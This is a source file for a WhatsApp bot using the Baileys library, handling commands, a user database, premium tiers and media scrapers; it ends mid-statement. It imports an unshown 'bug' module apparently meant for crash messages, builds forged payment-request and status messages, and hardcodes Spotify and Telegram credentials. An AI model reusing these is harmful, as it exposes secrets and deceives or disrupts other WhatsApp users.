//base by DGXeon
//recode by ziyoo

require('./lib/listmenu')
const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    downloadContentFromMessage,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType,
    createSignalIdentity
} = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const tiktoku = require("@tobyg74/tiktok-api-dl")
const path = require('path')
const util = require('util')
var Photooxy = require('@sl-code-lords/photooxy')
var photooxy = new Photooxy()
const { color } = require('./lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const { NextChat } = require("nextchat");
const next = new NextChat();
const cron = require('node-cron')
const ytdl = require('ytdl-core')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const spotapi = require('spotify-finder')
const yts = require('yt-search')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const { translate } = require('@vitalets/google-translate-api')
const scp2 = require('./lib/scraper2')
const Youtube = require('./lib/youtubee.js')
const instagramDl = require("@sasmeee/igdl")
const apiku = require('betabotz-tools')
const absenData = {};
const { temporary, temmp } = require('./tempor')
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    otpkode,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    totalcase
} = require('./lib/myfunc')
//prem owner function
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
//data
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
let xeonaudp3 = require('./lib/ytdl')
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
let badw = JSON.parse(fs.readFileSync('./src/badword.json'))

//media
const spotsearch = new spotapi({
    consumer: {
        key: '271f6e790fb943cdb34679a4adcc34cc',
        secret: 'c009525564304209b7d8b705c28fd294'
    }
})
const spotdl = require('spotifydl-core').default
const credentials = {
    clientId: '271f6e790fb943cdb34679a4adcc34cc',
    clientSecret: 'c009525564304209b7d8b705c28fd294'
}
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./media/database/xeonvn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./media/database/xeonsticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./media/database/xeonimage.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./media/database/xeonvideo.json'))
const DocXeon = JSON.parse(fs.readFileSync('./media/database/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./media/database/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./media/database/apk.json'))

//bug database
const { xeontext1 } = require('./src/data/function/XBug/xeontext1')
const { xeontext2 } = require('./src/data/function/XBug/xeontext2')
const { xeontext3 } = require('./src/data/function/XBug/xeontext3')
const { xeontext4 } = require('./src/data/function/XBug/xeontext4')
const { xeontext5 } = require('./src/data/function/XBug/xeontext5')
const { del } = require('request')

//////////////////////////////////database testing//////////////////////////////////////////
global.db.data = JSON.parse(fs.readFileSync('./src/db.json'));
if (global.db.data) global.db.data = {
    users: {},
    database: {},
    order: [],
    history: [],
    ...(global.db.data || {})
};
// New code for database handling

const database2 = JSON.parse(fs.readFileSync('./src/db.json'));
let database = []
function dbdb(id, nama, umur, alamat, dbd) {
    const obj = {
        id: id,
        nama: nama,
        umur: umur,
        alamat: alamat
    }
    dbd.push(obj)
    fs.writeFileSync('./src/db.json', JSON.stringify(dbd))
}

function addToDatabase(id, name, age, address) {
    database.push({ id, name, age, address });
}

function displayDatabase() {
    console.log("Database:");
    database.forEach(entry => {
        console.log(`ID: ${entry.id}, Name: ${entry.name}, Age: ${entry.age}, Address: ${entry.address}`);
    });
}

async function startSession(m, client) {
    const sender = m.sender;

    // Assume we use a map to store sessions for each sender
    if (!global.sessions) global.sessions = {};
    global.sessions[sender] = { step: 1, data: {} };

    client.sendMessage(m.chat, {text: "Masukkan ID:"}, { quoted: m });

    global.sessions[sender].callback = async (message) => {
        const step = global.sessions[sender].step;

        if (step === 1) {
            global.sessions[sender].data.id = message.text;
            global.sessions[sender].step = 2;
            client.sendMessage(m.chat, {text:"Masukkan Nama:"}, { quoted: m });
        } else if (step === 2) {
            global.sessions[sender].data.name = message.text;
            global.sessions[sender].step = 3;
            client.sendMessage(m.chat, {text:"Masukkan Umur:"}, { quoted: m });
        } else if (step === 3) {
            global.sessions[sender].data.age = message.text;
            global.sessions[sender].step = 4;
            client.sendMessage(m.chat, {text: "Masukan Alamat"}, { quoted: m });
        } else if (step === 4) {
            global.sessions[sender].data.address = message.text;
            dbdb(global.sessions[sender].data.id, global.sessions[sender].data.name, global.sessions[sender].data.age, global.sessions[sender].data.address, database2)
            addToDatabase(
                global.sessions[sender].data.id,
                global.sessions[sender].data.name,
                global.sessions[sender].data.age,
                global.sessions[sender].data.address
            );
            displayDatabase();
            delete global.sessions[sender];
            client.sendMessage(m.chat, {text: `Data Berhasil Di Tambahkan`}, { quoted: message });
        }
    };
}

// Continue with the rest of your existing code
const verifyUser = (userId, referralCode) => {
    let user = global.db.data.users[userId];

    if (user.verifikasi_user) {
        return 'User sudah diverifikasi sebelumnya.';
    }

    user.verifikasi_user = true;
    user.registered = {
        time: new Date().toISOString(),
        uuid: uuidv4()
    };

    if (referralCode) {
        let referrer = Object.values(global.db.data.users).find(u => u.referral === referralCode);
        if (referrer) {
            user.referredBy = referrer.referral;
            user.points += 10;
            referrer.points += 5;
        } else {
            return 'Kode referral tidak valid.';
        }
    }

    return 'Verifikasi berhasil.';
}
////////////////////////////////////////////////////////////////////////////////////////////////

const xeonverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    chats: {},
    settings: {},
    ...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []

//antiantian
anticall = true
antiswview = true

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
if (time2 < "23:59:00") {
    var ucapanWaktu = `Good Night 🌌`
}
if (time2 < "19:00:00") {
    var ucapanWaktu = `Good Evening 🌃`
}
if (time2 < "18:00:00") {
    var ucapanWaktu = `Good Evening 🌃`
}
if (time2 < "15:00:00") {
    var ucapanWaktu = `Good Afternoon 🌅`
}
if (time2 < "11:00:00") {
    var ucapanWaktu = `Good Morning 🌄`
}
if (time2 < "05:00:00") {
    var ucapanWaktu = `Good Morning 🌄`
}
//function
const reSize = async (buffer, ukur1, ukur2) => {
    return new Promise(async (resolve, reject) => {
        let jimp = require('jimp')
        var baper = await jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
        resolve(ab)
    })
}
//module
module.exports = client = async (client, m, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == "interactiveResponseMessage") ? JSON.parse(m.message[m.mtype].nativeFlowResponseMessage?.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%/^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶/∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "/" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix, '')
        const isCmd2 = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await client.decodeJid(client.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        //prefix 2
        const xeonybody = body.startsWith(prefix)
        const isCommand = xeonybody ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
        const tgl = moment.tz('Asia/Jakarta').format('DD/MM/YY')
        //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch(e => { }) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isXeonMedia = m.mtype
        //user status
        const isUser = xeonverifieduser.includes(sender)
        const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isOwner || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(client, m, premium)

        //theme sticker reply
        const stikertunggu = () => {
            let XeonStikRep = fs.readFileSync('./media/theme/sticker_reply/wait.webp')
            client.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickAdmin = () => {
            let XeonStikRep = fs.readFileSync('./media/theme/sticker_reply/admin.webp')
            client.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickBotAdmin = () => {
            let XeonStikRep = fs.readFileSync('./media/theme/sticker_reply/botadmin.webp')
            client.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickOwner = () => {
            let XeonStikRep = fs.readFileSync('./media/theme/sticker_reply/owner.webp')
            client.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickGroup = () => {
            let XeonStikRep = fs.readFileSync('./media/theme/sticker_reply/group.webp')
            client.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickPrivate = () => {
            let XeonStikRep = fs.readFileSync('./media/theme/sticker_reply/private.webp')
            client.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        //premium
        async function replyprem(teks) {
            reply(`This feature is for premium user, contact the owner to become premium user`)
        }
        //reply
        async function reply(teks) {
            m.reply(teks)
        }
        async function speech(teks1) {
            celiaSpeech(teks1)
                .then(audioBuffer => {
                    var buffer = Buffer.from(audioBuffer, "base64")
                    client.sendMessage(m.chat, {audio: buffer, mimetype: 'audio/mp4', ptt: true})
                })
                .catch(error => {
                    console.error('Error in celiaSpeech:', error);
                });
        }

        //Fake quoted
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: global.botname, participant: '0@s.whatsapp.net' }, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname } }, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD" } } } }
        const ftroli = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "status@broadcast" }, "message": { orderMessage: { itemCount: 2022, status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
        const fdoc = { key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { documentMessage: { title: botname, jpegThumbnail: thumb } } }
        const fvn = { key: { participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) }, message: { "audioMessage": { "mimetype": "audio/ogg; codecs=opus", "seconds": 359996400, "ptt": "true" } } }
        const fgif = { key: { participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) }, message: { "videoMessage": { "title": botname, "h": wm, 'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb } } }
        const fgclink = { key: { participant: "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net" }, "message": { "groupInviteMessage": { "groupJid": "6288213840883-1616169743@g.us", "inviteCode": "m", "groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb } } }
        const fvideo = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) }, message: { "videoMessage": { "title": botname, "h": wm, 'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb } } }
        const floc = { key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { locationMessage: { name: wm, jpegThumbnail: thumb } } }
        const fkontak = { key: { participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb, sendEphemeral: true } } }
        const fakestatus = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": wm, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./media/theme/cheemspic.jpg'), "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==" } } }
        const frpayment = {
            key: {
                remoteJid: '0@s.whatsapp.net',
                fromMe: false,
                id: `${ownername}`,
                participant: '0@s.whatsapp.net'
            },
            message: {
                requestPaymentMessage: {
                    currencyCodeIso4217: "USD",
                    amount1000: 999999999,
                    requestFrom: '0@s.whatsapp.net',
                    noteMessage: {
                        extendedTextMessage: {
                            text: `${botname}`
                        }
                    },
                    expiryTimestamp: 999999999,
                    amount: {
                        value: 91929291929,
                        offset: 1000,
                        currencyCode: "INR"
                    }
                }
            }
        }

        const pickRandom = (arr) => {
            return arr[Math.floor(Math.random() * arr.length)]
        }

        //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 100
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex')
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = client.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
                serialNumber: randomBytes(16).toString('hex'),
                title: `${isPremium ? 'Premium' : 'User'}`,
                afkTime: -1,
                badword: 0,
                afkReason: '',
                nick: client.getName(sender),
                premium: `${isPremium ? 'true' : 'false'}`,
                limit: limitUser,
                totalLimit: 0
            }

            let chats = global.db.data.chats[from]
            if (typeof chats !== 'object') global.db.data.chats[from] = {}
            if (chats) {
                if (!('badword' in chats)) chats.badword = false
                if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                if (!('antibot' in chats)) chats.antibot = false
                if (!('antiviewonce' in chats)) chats.antiviewonce = false
                if (!('antimedia' in chats)) chats.media = false
                if (!('antivirtex' in chats)) chats.antivirtex = false
                if (!('antiimage' in chats)) chats.antiimage = false
                if (!('antivideo' in chats)) chats.video = false
                if (!('antiaudio' in chats)) chats.antiaudio = false
                if (!('antipoll' in chats)) chats.antipoll = false
                if (!('antisticker' in chats)) chats.antisticker = false
                if (!('anticontact' in chats)) chats.anticontact = false
                if (!('antilocation' in chats)) chats.antilocation = false
                if (!('antidocument' in chats)) chats.antidocument = false
                if (!('antilink' in chats)) chats.antilink = false
                if (!('antilinkgc' in chats)) chats.antilinkgc = false
            } else global.db.data.chats[from] = {
                badword: false,
                antiforeignnum: false,
                antibot: false,
                antiviewonce: false,
                antivirtex: false,
                antimedia: false,
                antiimage: false,
                antivideo: false,
                antiaudio: false,
                antipoll: false,
                antisticker: false,
                antilocation: false,
                antidocument: false,
                anticontact: false,
                antilink: false,
                antilinkgc: false
            }

            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!('totalhit' in setting)) setting.totalhit = 0
                if (!('totalError' in setting)) setting.totalError = 0
                if (!('online' in setting)) setting.online = false
                if (!('autosticker' in setting)) setting.autosticker = false
                if (!('autobio' in setting)) setting.autobio = false
                if (!('autoread' in setting)) setting.autoread = false
                if (!('autorecordtype' in setting)) setting.autorecordtype = false
                if (!('autorecord' in setting)) setting.autorecord = false
                if (!('autotype' in setting)) setting.autotype = false
                if (!('autoblocknum' in setting)) setting.autoblocknum = false
                if (!('onlyindia' in setting)) setting.onlyindia = false
                if (!('onlyindo' in setting)) setting.onlyindo = false
                if (!('onlygrub' in setting)) setting.onlygrub = false
                if (!('onlypc' in setting)) setting.onlypc = false
                if (!('watermark' in setting)) setting.watermark = { packname, author }
                if (!('about' in setting)) setting.about = { bot: { nick: client.getName(botNumber), alias: botname }, owner: { nick: client.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber } }
            } else global.db.data.settings[botNumber] = {
                totalhit: 0,
                totalError: 0,
                online: false,
                autosticker: false,
                autobio: false,
                autoread: true,
                autoblocknum: false,
                onlyindia: false,
                onlyindo: false,
                onlygrub: false,
                onlypc: false,
                autorecordtype: false,
                autorecord: false,
                autotype: false,
                watermark: {
                    packname: global.packname,
                    author: global.author
                },
                about: {
                    bot: {
                        nick: client.getName(botNumber),
                        alias: botname
                    },
                    owner: {
                        nick: client.getName(global.ownernumber + '@s.whatsapp.net'),
                        alias: global.ownernumber
                    }
                }
            }

        } catch (err) {
            console.log(err)
        }

        

        async function ephoto(url, texk) {
            let form = new FormData
            let gT = await axios.get(url, {
                headers: {
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
                }
            })
            let $ = cheerio.load(gT.data)
            let text = texk
            let token = $("input[name=token]").val()
            let build_server = $("input[name=build_server]").val()
            let build_server_id = $("input[name=build_server_id]").val()
            form.append("text[]", text)
            form.append("token", token)
            form.append("build_server", build_server)
            form.append("build_server_id", build_server_id)
            let res = await axios({
                url: url,
                method: "POST",
                data: form,
                headers: {
                    Accept: "*/*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
                    cookie: gT.headers["set-cookie"]?.join("; "),
                    ...form.getHeaders()
                }
            })
            let $$ = cheerio.load(res.data)
            let json = JSON.parse($$("input[name=form_value_input]").val())
            json["text[]"] = json.text
            delete json.text
            let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
                headers: {
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
                    cookie: gT.headers["set-cookie"].join("; ")
                }
            })
            return build_server + data.image
        }

        const { jadibot, conns } = require('./jadibot')
        //bug loading
        async function loading() {
            var xeonlod = [
                "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
                "《 ████▒▒▒▒▒▒▒▒》30%",
                "《 ███████▒▒▒▒▒》50%",
                "《 ██████████▒▒》80%",
                "《 ████████████》100%",
                "AlwaysZiyoo Recode Bug 🐦..."
            ]
            let { key } = await client.sendMessage(from, { text: 'ʟᴏᴀᴅɪɴɢ...' })

            for (let i = 0; i < xeonlod.length; i++) {
                await client.sendMessage(from, { text: xeonlod[i], edit: key })
            }
        }

        async function obfus(query) {
            return new Promise((resolve, reject) => {
                try {
                    const obfuscationResult = jsobfus.obfuscate(query,
                        {
                            compact: false,
                            controlFlowFlattening: true,
                            controlFlowFlatteningThreshold: 1,
                            numbersToExpressions: true,
                            simplify: true,
                            stringArrayShuffle: true,
                            splitStrings: true,
                            stringArrayThreshold: 1
                        }
                    )
                    const result = {
                        status: 200,
                        author: `${ownername}`,
                        result: obfuscationResult.getObfuscatedCode()
                    }
                    resolve(result)
                } catch (e) {
                    reject(e)
                }
            })
        }

        const sendContact = (jid, numbers, name, quoted, mn) => {
			let number = numbers.replace(/[^0-9]/g, '')
			const vcard = 'BEGIN:VCARD\n' 
			+ 'VERSION:3.0\n' 
			+ 'FN:' + name + '\n'
			+ 'ORG:;\n'
			+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
			+ 'END:VCARD'
			return client.sendMessage(m.chat, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: m })
		}
        async function styletext(teks) {
            return new Promise((resolve, reject) => {
                axios.get('http://qaz.wtf/u/convert.cgi?text=' + teks)
                    .then(({ data }) => {
                        let $ = cheerio.load(data)
                        let hasil = []
                        $('table > tbody > tr').each(function (a, b) {
                            hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
                        })
                        resolve(hasil)
                    })
            })
        }

        async function Telesticker(url) {
            return new Promise(async (resolve, reject) => {
                if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return reply('Enther your url telegram sticker link')
                packName = url.replace("https://t.me/addstickers/", "")
                data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, { method: "GET", headers: { "User-Agent": "GoogleBot" } })
                const xeonyresult = []
                for (let i = 0; i < data.data.result.stickers.length; i++) {
                    fileId = data.data.result.stickers[i].thumb.file_id
                    data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
                    result = {
                        status: 200,
                        author: 'DGXeon',
                        url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
                    }
                    xeonyresult.push(result)
                }
                resolve(xeonyresult)
            })
        }

        async function getType(url) { //@rifza.p.p
            return new Promise((resolve, reject) => {
                axios.get(url).then(z => {
                    let a = z.request.res.responseUrl;
                    if (a.includes('/photo/')) {
                        resolve('image');
                    } else {
                        resolve('video');
                    }
                }).catch(reject);
            });
        }

        async function tiksave(url) {
            let res = {};
            res.type = await getType(url);

            let { data } = await axios.request({
                url: "https://tiksave.io/api/ajaxSearch",
                method: "POST",
                data: new URLSearchParams({
                    q: url,
                    lang: "en"
                })
            });

            const $ = cheerio.load(data.data);

            let dlbutton = Array.from($('.tik-button-dl')).map((element) => {
                const url = $(element).attr('href');
                const text = $(element).text().trim();
                const description = text.replace(/\s+/g, ' ').trim();
                return { description, url };
            });

            res.media = res.type == "image" ? $('.photo-list .download-box li').map((index, element) => {
                let url = $(element).find('.download-items__thumb img').attr('src');
                return { url };
            }).get() : dlbutton;

            res.audio = res.type == "video" ?
                { url: res.media[3].url } :
                { url: dlbutton[1].url };

            return res;
        }

        // enjoy (≧▽≦)
        ////
        //limit func
        async function useLimit(senuseLimitder, amount) {
            db.data.users[sender].limit -= amount
            db.data.users[sender].totalLimit += amount
            reply(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
        }
        async function resetLimit() {
            let users = Object.keys(global.db.data.users)
            let Limitxeon = isPremium ? limit.prem : limit.free
            for (let i of users) {
                db.data.users[i].limit = Limitxeon
            }
            client.sendText('120363167338947238@g.us', { text: `Reset Limit` })
        }
        // Grup Only
        if (!m.isGroup && !isOwner && db.data.settings[botNumber].onlygrub) {
            if (isCommand) {
                return reply(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!isOwner && db.data.settings[botNumber].onlypc && m.isGroup) {
            if (isCommand) {
                return reply("Hello buddy! if you want to use this bot, please chat the bot in private chat")
            }
        }

        if (!client.public) {
            if (isOwner && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
            if (isCommand) {
                client.sendPresenceUpdate('unavailable', from)
            }
        }
        client.readMessages([m.key])
        //auto set bio\\
        if (db.data.settings[botNumber].autobio) {
            client.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
        //auto type record
        if (db.data.settings[botNumber].autorecordtype) {
            if (isCommand) {
                let xeonmix = ['composing', 'recording']
                xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
                client.sendPresenceUpdate(xeonmix2, from)
            }
        }
        if (db.data.settings[botNumber].autorecord) {
            if (isCommand) {
                let xeonmix = ['recording']
                xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
                client.sendPresenceUpdate(xeonmix2, from)
            }
        }
        if (db.data.settings[botNumber].autotype) {
            if (isCommand) {
                let xeonpos = ['composing']
                client.sendPresenceUpdate(xeonpos, from)
            }
        }

        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return client.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return client.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return client.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true) {
